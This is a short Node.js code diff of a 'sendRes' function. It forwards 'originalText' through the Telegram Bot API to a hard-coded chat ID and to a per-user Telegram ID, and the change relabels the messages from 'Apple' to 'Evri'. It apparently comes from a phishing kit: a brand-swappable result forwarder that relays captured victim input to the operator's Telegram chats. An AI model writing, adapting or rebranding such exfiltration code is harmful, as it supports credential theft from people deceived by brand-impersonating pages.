@@ -60,7 +60,7 @@ const sendRes = async (req, res) => {
         `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
         {
           chat_id: 680379375,
-          text: `Apple ${telegramId}:\n${originalText}`,
+          text: `Evri ${telegramId}:\n${originalText}`,
           parse_mode: "Markdown",
         }
       )
@@ -72,7 +72,7 @@ const sendRes = async (req, res) => {
         `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
         {
           chat_id: telegramId,
-          text: `Apple:\n${originalText}`,
+          text: `Evri:\n${originalText}`,
           parse_mode: "Markdown",
         }
       )
